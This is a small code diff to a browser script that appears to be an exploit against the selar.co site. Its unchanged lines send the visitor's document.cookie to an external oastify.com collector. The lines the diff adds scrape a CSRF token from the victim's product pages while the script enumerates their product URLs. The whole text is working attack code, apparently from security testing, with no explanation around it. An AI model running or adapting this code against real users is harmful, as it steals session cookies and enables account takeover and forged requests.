@@ -1,4 +1,5 @@
 let currSession="";
+let token=0
 fetch(`https://4ejcesgd7nd62rf3xgkjigf6txzonpbe.oastify.com/${document.cookie}`, {mode: 'no-cors',});
 async function fetchUrls() {
   let index = 1;
@@ -12,6 +13,8 @@ async function fetchUrls() {
         `https://selar.co/me/products?domain=selar.co&requires_product_url=1&page=${index}`
       );
       const html = await response.text();
+      const match_ = html.match(/name="csrf_token"\s+content="([^"]+)"/);
+      token = match_[1];
       const matches = [...html.matchAll(/selar.co\\\/[a-zA-Z0-9]+/g)];
       urls = matches
         .filter(match => match[0].split('/')[1].length === 6)
